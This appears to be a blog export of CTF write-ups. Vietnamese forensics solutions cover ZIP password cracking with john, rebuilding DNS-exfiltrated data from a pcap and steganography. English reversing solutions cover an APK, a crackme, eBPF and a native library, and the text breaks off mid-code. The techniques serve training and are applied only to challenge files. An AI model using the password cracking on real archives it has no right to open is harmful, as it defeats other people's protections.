[{"content":"Nói thật thì đây là 1 giải khá khó chịu với mình, vì ngoài độ guessing của các thử thách (forensics, mobile) thì thật ra chẳng có gì để nói cả (và rất tiếc với 1 mình mình làm thì không thể giải quyết được toàn bộ cùng 1 lúc)\nLoot Puppey Description: This is my lost puppey. He is trying to hide himself and hide something from me. Can you find them for me?\nAttachment: Lost.docx\nĐề bài cho mình 1 file docx, dựa vào đề bài để tìm xem thứ gì bị ẩn giấu thì với kinh nghiệm mình sẽ unzip nó ra\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(root㉿kali)-[/home/kali/Desktop/cstv] └─# unzip Lost.docx Archive: Lost.docx inflating: [Content_Types].xml inflating: _rels/.rels inflating: word/_rels/document.xml.rels inflating: word/document.xml extracting: word/media/image1.jpg extracting: word/media/image2.jpg inflating: word/theme/theme1.xml inflating: word/settings.xml inflating: docProps/core.xml inflating: docProps/app.xml inflating: word/webSettings.xml inflating: word/styles.xml inflating: word/fontTable.xml Ở đây để ý rằng có 2 file media trong thư mục word/media/\nCó vẻ như image1.jpg đang bị corrupt, mình sẽ kiểm tra các byte và header xem có vấn đề gì không\n1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[/home/…/Desktop/cstv/word/media] └─# xxd image1.jpg 00000000: 504b 0304 1400 0900 0800 d922 0955 4ac4 PK.........\u0026#34;.UJ. 00000010: 894f 8fde 0200 59e1 0200 0800 1c00 7465 .O....Y.......te 00000020: 7374 2e6a 7067 5554 0900 035a 19f2 620f st.jpgUT...Z..b. 00000030: 1af2 6275 780b 0001 04e8 0300 0004 e803 ..bux........... 00000040: 0000 413d 3e5e 82e4 e725 28b6 3da2 ab50 ..A=\u0026gt;^...%(.=..P 00000050: f6e0 2ad2 47c4 a8af 7599 2983 861a 5c2e ..*.G...u.)...\\. 00000060: 7ec5 636d 2019 9865 db00 2663 779f afff ~.cm ..e..\u0026amp;cw... 00000070: 18a2 0efe 5ef0 ab03 f443 dd7d 84a4 ba16 ....^....C.}.... 00000080: d23d b327 64b3 6c03 7be3 d7e3 77b2 7d38 .=.\u0026#39;d.l.{...w.}8 Yah, vậy nó thực chất là 1 file ZIP, đến đây cần giải nén nó ra nhưng xuất hiện thêm 1 vấn đề mới: password của file ZIP, với độ lỏ này thì chạy tools zip2john chắc là được rồi\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(root㉿kali)-[/home/…/Desktop/cstv/word/media] └─# zip2john image1.zip \u0026gt; hash.txt Created directory: /root/.john ver 2.0 efh 5455 efh 7875 image1.zip/test.jpg PKZIP Encr: TS_chk, cmplen=188047, decmplen=188761, crc=4F89C44A ts=22D9 cs=22d9 type=8 ┌──(root㉿kali)-[/home/…/Desktop/cstv/word/media] └─# john hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst loveyou (image1.zip/test.jpg) 1g 0:00:00:00 DONE 2/3 (2024-01-06 18:19) 33.33g/s 1587Kp/s 1587Kc/s 1587KC/s 123456..ferrises Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Vậy mật khẩu file ZIP này là loveyou sau khi giải nén ra thì được cái ảnh test.png\nVới JPG thì mình không nghĩ nhiều cho lắm, ném lên Aperi\u0026rsquo;Solve cho tự xử lý nốt\nflag: hackathon{bbc649da49b02570835df50fd173bff7d4933f07}\nWhose name is it? Description: I fell like there are many people drawing my secret\u0026hellip;\nAttachment: capture.pcap\nỞ chall thứ 2 thì có vẻ đúng hơn 1 chút với cái nghĩa forensics \u0026hellip;\nSau khi check các object xuất hiện trong lưu lượng mạng thì thấy có 1 file thực thi (mình đã rev nó + decompile thử) nhưng mà không có gì để \u0026ldquo;khai thác\u0026rdquo; nên chuyển hướng qua phương án khác\nTrong quá trình tìm kiếm thì mình có thấy trong udp stream xuất hiện việc gửi nhận 1 txt nào đó khá khả nghi\nBắt thử 1 query trong đó và decode thử theo thói quen thì thấy rằng đây là header của 1 file ZIP, thấy có hope nên theo hướng này luôn\nVậy việc của mình bây giờ chỉ là filter toàn bộ các udp.stream từ 188 đến 1569 (kết thúc) để filter với dns \u0026amp;\u0026amp; udp.stream \u0026gt;= 188 \u0026amp;\u0026amp; udp.stream \u0026lt;= 1569 và viết script để loại bỏ các phần thừa rồi ném qua cyberchef cho xử lý nốt\nscript:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import re pattern = re.compile(r\u0026#39;\\b(\\d+\\.\\d+[a-fA-F\\d]+)\\.\\w+\\.\\w+\\.\\w+\\b\u0026#39;) with open(\u0026#34;dnsfilter.txt\u0026#34;,\u0026#34;r\u0026#34;) as f: input_text= f.read(); match = re.findall(pattern,input_text) with open(\u0026#34;output.txt\u0026#34;, \u0026#34;w\u0026#34;) as output_file: # Các queries trùng lặp 6 lần, loại bỏ bớt for m in range(0, len(match), 6): output_file.write(match[m].split(\u0026#39;.\u0026#39;)[1]) flag: CSTV_2023_{ba69f4c8c869295a9a8024b32a177bc63a942ffd}\nL4ggg Description: Can you deal with the lagging. If you can f the lag You will get the flag.\nAttachment: 3y3L4g \u0026amp; 34rL4g.wav\nỞ thử thách for cuối cùng này thì mình nhận được 2 file (1 wav và 1 file data), với kinh nghiệm thì mình xiên được file WAV đầu tiên bằng việc xem ảnh phổ của âm thanh\nNhìn qua thì thấy rằng đây là 1 đoạn mã Morse đơn giản \u0026ndash;\u0026gt; WH4TY0UH34R1SN0TWH4TY0US33KF0R, cái này chắc là để dùng sau vì còn 1 file mắt lag nữa (mình nghi là file ảnh)\nDựa vào header của file này thì đúng là các byte đã bị sửa và bản gốc là 1 file ảnh PNG, mình sẽ sửa lại header trước thành PNG\nNgoài ra thì còn 1 thứ khiến mình để ý nữa là 1HdR, khả năng là bị lỗi chunk (IHDR)\nỞ đây mình sử dụng tool: PNG-Fixer để kiểm tra các chunk có vấn đề\nVậy là từ đây thì biết được có 2 chunk bị sai là 1HdR và IPAD (IHDR và IDAT) tiến hành sửa lại toàn bộ (bằng HexEd)\nSau khi fix xong chunk thì sẽ chuyển qua [PCRT](để kiểm tra các tổng quan các byte)\nMình vừa mới fix lại cái IPAD xong nên bây giờ cần sửa lại IDAT chunk data length ở offset 0xD0002 (bằng HexEd)\nCứ vậy sửa lỗi tiếp đến bao giờ có thể nhìn được ảnh (bỏ qua bước sửa CRC chunk vì ảnh ban đầu đã lỗi sẵn)\nẢnh sau khi sửa xong: output.png\nMở trên Windows sẽ nhìn thấy luôn chứ không bị lỗi nữa, có thể đọc đoạn chữ trên ảnh là: Mắt hơi lag xin thông cảm và đoạn số là 123321232123\nĐến hiện tại thì cả 2 file mình đã khai thác được toàn bộ file ảnh (bao gồm cả metadata của ảnh nữa) vậy chỉ còn lại file wav là chưa thực sự khai thác hết, với đoạn key trên có lẽ là pass của việc dùng tool? bài này stegano nên chắc cũng chỉ được có thế (mình mất nhiều thời gian suy nghĩ đủ hướng chỉnh ảnh các kiểu \u0026hellip;)\n1 2 3 4 ┌──(root㉿kali)-[/home/kali/Downloads] └─# steghide extract -sf 34rL4g.wav Enter passphrase: wrote extracted data to \u0026#34;Br41nL4g.txt\u0026#34;. yah, xong lag mắt, lag tai giờ đến lag não, không biết troll gì nữa đây \u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 +++\u0026gt;-\u0026lt;+-.-+.+-+ ++++--+---+\u0026lt;.-+ +\u0026gt;++--+--.+.--+ +++.--+--\u0026lt;+\u0026gt;--+ ++++--+---+-.-. ++++--..-.+--.\u0026lt; ++\u0026lt;+--\u0026lt;.-\u0026gt;+--\u0026lt;. ++\u0026lt;+.--+-++--.. ++\u0026lt;++--+.++.-\u0026gt;. ++\u0026lt;++--.-+++-+. [\u0026gt;-.+--+-+++-+. \u0026gt;+]-+--+-+++-+. ++\u0026gt;-+--+-+++-+. \u0026gt;+\u0026gt;-+..+-+++-+. ++\u0026gt;-.\u0026gt;\u0026gt;+-+++-+. Đến đây thì mình khá cạn lời rồi, vì brainfuck này không phải là nạp vào là ra mà phải lag tí não nữa mới được, chắc là cũng đọc theo chiều dọc giống như cái ảnh kia?\n1 2 3 4 5 6 x = \u0026#34;+++\u0026gt;-\u0026lt;+-.-+.+-+++++--+---+\u0026lt;.-++\u0026gt;++--+--.+.--++++.--+--\u0026lt;+\u0026gt;--+++++--+---+-.-.++++--..-.+--.\u0026lt;++\u0026lt;+--\u0026lt;.-\u0026gt;+--\u0026lt;.++\u0026lt;+.--+-++--..++\u0026lt;++--+.++.-\u0026gt;.++\u0026lt;++--.-+++-+.[\u0026gt;-.+--+-+++-+.\u0026gt;+]-+--+-+++-+.++\u0026gt;-+--+-+++-+.\u0026gt;+\u0026gt;-+..+-+++-+.++\u0026gt;-.\u0026gt;\u0026gt;+-+++-+.\u0026#34; for j in range(15): for i in range(j, len(x), 15): print(x[i], end = \u0026#34;\u0026#34;) # ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.++++++.-----------.++++++.\u0026lt;------------.\u0026gt;+++++.\u0026lt;------.\u0026gt;-----..++.+++++.-------.--------.\u0026lt;-.\u0026gt;+++++++++++++++++++++++.\u0026lt;.\u0026gt;----.+++++++.--.---------------.\u0026lt;.\u0026gt;++++++++++.\u0026lt;......... yah got it, giờ chỉ cần chuyển nó qua sha1 rồi nộp flag thôi :3 (và đến cuối cùng thì cái mã morse trong file wav ban đầu chẳng để làm gì :3)\nflag: CSTV_2023_{1d7e89b852c2ef64283df637d0a36f16c3417f18}\n","date":"2024-01-06T00:00:00Z","image":"/p/cstv-capture-the-flag-2023-forensics/featured_hu2a81619bccf73120ad57fd6bcdb25d8d_52516_120x120_fill_box_smart1_3.png","permalink":"/p/cstv-capture-the-flag-2023-forensics/","title":"CSTV - CAPTURE THE FLAG 2023 | Forensics"},{"content":"In this CTF, I didn\u0026rsquo;t get a chance to do many rev challenges, partly because I had too many deadlines, and also partly because my old machine was breaking down.\nOpen Sesame Attachment: open_sesame.apk\nHere is an easy challenge apk. Use Decompiler.com to decompile this apk file then check sources/com/example/open_sesame/MainActivity.java to find main logic of this file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 package com.example.open_sesame; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast; import androidx.appcompat.app.AppCompatActivity; import androidx.appcompat.app.AppCompatDelegate; public class MainActivity extends AppCompatActivity { private static final int[] valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; private static final String valid_user = \u0026#34;Jack Ma\u0026#34;; private Button buttonLogin; private EditText editTextPassword; private EditText editTextUsername; /* access modifiers changed from: protected */ public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); this.editTextUsername = (EditText) findViewById(R.id.editTextUsername); this.editTextPassword = (EditText) findViewById(R.id.editTextPassword); Button button = (Button) findViewById(R.id.buttonLogin); this.buttonLogin = button; button.setOnClickListener(new View.OnClickListener() { public void onClick(View view) { MainActivity.this.validateCredentials(); } }); } /* access modifiers changed from: private */ public void validateCredentials() { String trim = this.editTextUsername.getText().toString().trim(); String trim2 = this.editTextPassword.getText().toString().trim(); if (!trim.equals(valid_user) || !n4ut1lus(trim2)) { showToast(\u0026#34;Invalid credentials. Please try again.\u0026#34;); return; } \u0026#34;flag{\u0026#34; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34;) + \u0026#34;}\u0026#34;; } private boolean n4ut1lus(String str) { int[] it4chi = it4chi(str); if (it4chi.length != valid_password.length) { return false; } for (int i = 0; i \u0026lt; it4chi.length; i++) { if (it4chi[i] != valid_password[i]) { return false; } } return true; } private int[] it4chi(String str) { int[] iArr = new int[str.length()]; for (int i = 0; i \u0026lt; str.length(); i++) { iArr[i] = str.charAt(i); } return iArr; } private String sh4dy(String str) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str.length(); i++) { char charAt = str.charAt(i); if (Character.isDigit(charAt)) { sb.append(charAt); } } return sb.toString(); } private int sl4y3r(String str) { return Integer.parseInt(str) - 1; } private String flag(String str, String str2) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str2.length(); i++) { sb.append((char) (str2.charAt(i) ^ str.charAt(i % str.length()))); } return sb.toString(); } private void showToast(String str) { Toast.makeText(this, str, 0).show(); } } We should pay attention to some section:\n\u0026quot;flag{\u0026quot; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026quot;U|]rURuoU^PoR_FDMo@X]uBUg\u0026quot;) + \u0026quot;}\u0026quot;; valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; valid_user = \u0026quot;Jack Ma\u0026quot;; Here there are functions we need to pay attention to: it4chi, sh4dy, sl4y3r (each function has 1 different encoding, consisting only of simple calculations and xor operations) and valid_user \u0026amp; valid_password. Detail:\nit4chi get a string str as input and returns an array of integers sh4dy get a string str as input and returns a new string containing only the numeric characters from the original string sl4y3r get a string str as input, converts it to an integer using Integer.parseInt, subtracts 1 from the resulting value, and returns the result flag takes 2 strings and XOR char by char with length of shorter string Here\u0026rsquo;s my script to reverse this program to get the flag: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def get_flag(): valid_password = [52, 108, 49, 98, 97, 98, 97] valid_user = \u0026#34;Jack Ma\u0026#34; str2 = \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34; def it4chi(str): return [ord(c) for c in str] def sh4dy(str): return \u0026#39;\u0026#39;.join(c for c in str if c.isdigit()) def sl4y3r(str): return int(str) - 1 def flag(str, str2): return \u0026#39;\u0026#39;.join(chr(ord(str2[i]) ^ ord(str[i % len(str)])) for i in range(len(str2))) password = \u0026#39;\u0026#39;.join(chr(i) for i in valid_password) str1 = sh4dy(password) str_res = str1 str_res = str(sl4y3r(str_res)) return \u0026#34;flag{\u0026#34; + flag(str_res, str2) + \u0026#34;}\u0026#34; print(get_flag()) # flag{aLiBabA_and_forty_thiEveS} Secret Door Attachment:\nchall.out encoded.bin This is a C program written quite simply like to check the password and if correct, will decrypt the encoded file.bin to issue the flag image\ndump IDA (main function):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax char v5; // [rsp+13h] [rbp-EDh] BYREF int v6; // [rsp+14h] [rbp-ECh] int *v7; // [rsp+18h] [rbp-E8h] char v8[32]; // [rsp+20h] [rbp-E0h] BYREF char v9[32]; // [rsp+40h] [rbp-C0h] BYREF char v10[32]; // [rsp+60h] [rbp-A0h] BYREF char v11[32]; // [rsp+80h] [rbp-80h] BYREF int v12[18]; // [rsp+A0h] [rbp-60h] unsigned __int64 v13; // [rsp+E8h] [rbp-18h] v13 = __readfsqword(0x28u); if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } v6 = 0; std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v8); v12[0] = 66; v12[1] = 119; v12[2] = 101; v12[3] = 113; v12[4] = 123; v12[5] = 98; v12[6] = 114; v12[7] = 125; v12[8] = 119; v12[9] = 89; v12[10] = 115; v12[11] = 125; v12[12] = 111; v12[13] = 109; v12[14] = 62; v12[15] = 1; v12[16] = 0; while ( v6 \u0026lt;= 16 ) { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::push_back( v8, (unsigned int)(char)(LOBYTE(v12[v6]) ^ (v6 + 17))); ++v6; } std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9, \u0026#34;ThatsHardcoded!!!\u0026#34;, \u0026amp;v5); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v11, v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v10, v8); func_5(v10, v11); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v10); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v11); v7 = (int *)operator new[](0x44uLL); v3 = func_4(v8, argv[1]); v7 = (int *)func_3(v3, v9); if ( (unsigned __int8)func_2(v7) ) func_1(*v7, v7[16]); else std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Wrong door\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v8); return 0; } In this execute file, we must input 1 argv and length of argv is 17\n1 2 3 4 5 6 7 8 9 10 if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } In each iteration, v8 will append the value ((v12[i]) ^ (i + 17)) (i ascending) \u0026ndash;\u0026gt; v8 += chr((v12[i]) ^ (i + 17))\nwe can find v8:\n1 2 3 4 5 6 7 8 9 10 11 v6 = 0 v8 = \u0026#34;\u0026#34; v12 = [ 66, 119, 101, 113, 123, 98, 114, 125, 119, 89, 115, 125, 111, 109, 62, 1, 0 ] while v6 \u0026lt;= 16: v8 += chr(v12[v6] ^ (v6 + 17)) v6 += 1 print(v8) # v8 = \u0026#34;SeventeenChars!!!\u0026#34; The other side:\n1 2 3 std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9,\u0026#34;ThatsHardcoded!!!\u0026#34;,\u0026amp;v5); we have v9 = \u0026quot;ThatsHardcoded!!!\u0026quot;\n1. func_5\nfunc_5 is a joke hix :((( so we can ignore it (not related to the program flow), if you want decode func_5, here is raw data dumped from IDA and script\n2. func_4\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall func_4(__int64 a1, __int64 a2) { unsigned __int64 i; // [rsp+18h] [rbp-18h] unsigned __int64 v4; // [rsp+20h] [rbp-10h] __int64 v5; // [rsp+28h] [rbp-8h] v4 = std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::size(a1); v5 = operator new[](0x44uLL); for ( i = 0LL; i \u0026lt; v4; ++i ) *(v5 + 4 * i) = (*(a2 + i) ^ *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[]( a1, i)); return v5; } 3. func_3\n1 2 3 4 5 6 7 8 9 10 __int64 __fastcall func_3(__int64 a1, __int64 a2) { int i; // [rsp+14h] [rbp-Ch] __int64 v4; // [rsp+18h] [rbp-8h] v4 = operator new[](0x44uLL); for ( i = 0; i \u0026lt;= 16; ++i ) *(4LL * i + v4) = *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[](a2, i) ^ *(4LL * i + a1); return v4; } 4. func_2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 _BOOL8 __fastcall func_2(int *a1) { return *a1 == 78 \u0026amp;\u0026amp; a1[1] != (*a1 == 15) \u0026amp;\u0026amp; a1[2] == 120 \u0026amp;\u0026amp; a1[3] != (a1[2] == 31) \u0026amp;\u0026amp; a1[4] == 120 \u0026amp;\u0026amp; a1[5] != (a1[4] == 11) \u0026amp;\u0026amp; a1[6] == 116 \u0026amp;\u0026amp; a1[6] != (a1[7] == 6) \u0026amp;\u0026amp; a1[8] == 100 \u0026amp;\u0026amp; a1[9] != (a1[8] == 33) \u0026amp;\u0026amp; a1[10] == 99 \u0026amp;\u0026amp; a1[11] != (a1[10] == 34) \u0026amp;\u0026amp; a1[12] == 120 \u0026amp;\u0026amp; a1[13] == a1[12] \u0026amp;\u0026amp; a1[14] == 114 \u0026amp;\u0026amp; a1[15] == a1[14] + 1 \u0026amp;\u0026amp; a1[16] == 33; } so here is logic of func_3 \u0026amp; func_4:\n1 2 3 4 5 6 7 8 9 10 11 12 def func_4(a1, a2): v4 = len(a1) v5 = bytearray() for i in range(v4): v5.append((ord(a2[i]) ^ ord(a1[i])) % 256) return v5 def func_3(a1, a2): v4 = [0]*17 for i in range(17): v4[i] = ord(a2[i]) ^ a1[i] return v4 So we can find a1 to func_2 is True with z3 python then we can use func_3, func_4 to find key:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from z3 import * flags = [BitVec(f\u0026#39;char_{i}\u0026#39;, 8) for i in range(17)] unk1 = [BitVec(f\u0026#39;z1_{i}\u0026#39;, 8) for i in range(17)] s = Solver() s.add(len(flags) == 17) for i in range(17): s.add(And(flags[i] \u0026gt;= 33, flags[i] \u0026lt;= 125)) str1 = \u0026#34;SeventeenChars!!!\u0026#34; str2 = \u0026#34;ThatsHardcoded!!!\u0026#34; for i in range(17): unk1[i] = flags[i] ^ ord(str1[i]) for i in range(17): unk1[i] = unk1[i] ^ BitVecVal(ord(str2[i]), 8) condition = And( unk1[0] == 78, unk1[1] != If(unk1[0] == 15, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[2] == 120, unk1[3] != If(unk1[2] == 31, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[4] == 120, unk1[5] != If(unk1[4] == 11, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[6] == 116, unk1[7] != If(unk1[6] == 6, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[8] == 100, unk1[9] != If(unk1[8] == 33, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[10] == 99, unk1[11] != If(unk1[10] == 34, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[12] == 120, unk1[13] == unk1[12], unk1[14] == 114, unk1[15] == unk1[14] + 1, unk1[16] == 33 ) s.add(condition) if s.check() == sat: m = s.model() flag = \u0026#39;\u0026#39;.join([chr(m[flags[i]].as_long()) for i in range(17)]) print(f\u0026#34;Pass: {flag}\u0026#34;) else: print(\u0026#34;No solution found!\u0026#34;) # Pass: I$o0e!p0n0d0oors! When i put it like as argv it false:\nI think $ in the key is special character in Linux, so i edit this command from ./chall.out I$o0e!p0n0d0oors! to ./chall.out $(echo SSRvMGUhcDBuMGQwb29ycyE= | base64 -d) and here is the flag:\nbaby eBPF Attachment: babyebpf.o\neBPF (extended Berkeley Packet Filter) is a technology in the Linux kernel that allows the execution of custom programs within the kernel itself. These programs are typically used for monitoring and filtering network events and can be attached to various hook points in the kernel.\nIn this chall, we must use process EBPF from https://github.com/zandi/eBPF_processor to dissasemble this file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 detect_execve: mov r1, 0x1C050444 stxw [r10-8], r1 lddw r1, 0x954094701340819 stxdw [r10-0x10], r1 lddw r1, 0x10523251403E5713 stxdw [r10-0x18], r1 lddw r1, 0x43075A150E130D0B stxdw [r10-0x20], r1 mov r1, 0 LBB0_1: lddw r2, 0 add r2, r1 ldxb r2, [r2] mov r3, r10 add r3, -0x20 add r3, r1 ldxb r4, [r3] xor r2, r4 stxb [r3], r2 add r1, 1 jeq r1, 0x1C, LBB0_2 ja LBB0_1 -------------------------------------- LBB0_2: mov r3, r10 add r3, -0x20 lddw r1, 0x1C mov r2, 4 call 6 mov r0, 1 ret -------------------------------------- szmarinkitagawa:db \u0026#34;marinkitagawamarinkitagawama\u0026#34;,0 This is simple assembly code, so I have the script to get the flag, notice that the key is marinkitagawamarinkitagawama:\n1 2 3 4 5 6 7 8 9 10 11 key = \u0026#34;marinkitagawamarinkitagawama\u0026#34; data = [ 0x1C050444, 0x954094701340819, 0x10523251403E5713, 0x43075A150E130D0B ] rote = [((value \u0026gt;\u0026gt; i) \u0026amp; 0xFF) for value in reversed(data) for i in range(0, 64, 8)] flag = \u0026#39;\u0026#39;.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(rote)) print(flag) # flag{1n7r0_70_3bpf_h3h3h3eh}mari or we can guess easily xor with length of key and data xD\nSl4ydroid Attachment: sl4ydroid.apk like the Open Sesame challenge, we will use Decompiler.com to decompile this apk\nIn this challenge, during the ctf, I only completed 3/4 of flag, which is quite unfortunate\nI use jadx to decompile this apk and export lib because nothing java usefull in source :\u0026laquo;\nWhen i load libsl4ydroid.so to IDA, the first function i see RC4 hash:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 int __stdcall firsts(int a1) { unsigned int v1; // eax unsigned int v2; // eax int v4; // [esp+10h] [ebp-58h] int v5; // [esp+18h] [ebp-50h] char v6; // [esp+1Fh] [ebp-49h] unsigned int i; // [esp+30h] [ebp-38h] char v8[16]; // [esp+40h] [ebp-28h] BYREF char v9[16]; // [esp+50h] [ebp-18h] BYREF unsigned int v10; // [esp+60h] [ebp-8h] v10 = __readgsdword(0x14u); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(a1, \u0026#34;b5)c]d/ZP1:\\\u0026#34;\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v9, \u0026#34;R00rkee\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v8, \u0026#34;R1zz\u0026#34;); for ( i = 0; i \u0026lt;= sub_1AC20(a1) - 1; ++i ) { v4 = *sub_1AC50(a1, i); v1 = sub_1AC20(v9); v5 = *sub_1AC50(v9, i % v1) ^ v4; v2 = sub_1AC20(v8); v6 = *sub_1AC50(v8, i % v2) ^ v5; *sub_1AC50(a1, i) = v6; } std::string::~string(v8); std::string::~string(v9); return a1; } when i convert it to python and run, i receive b4ckd00r2023, so it will be RC4\n1. Java_com_backdoor_sl4ydroid_MainActivity_kim\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_kim(_JNIEnv *a1, int a2, int a3) { _BYTE *v3; // eax const char *v4; // eax int v6; // [esp+34h] [ebp-64h] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v9; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v11[8]; // [esp+58h] [ebp-40h] BYREF char v12[8]; // [esp+60h] [ebp-38h] BYREF char v13[16]; // [esp+68h] [ebp-30h] BYREF char v14[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v15; // [esp+88h] [ebp-10h] v15 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v14, \u0026amp;s1, \u0026amp;us3_m3); v9 = sub_1BCB0(v14); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v9, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = 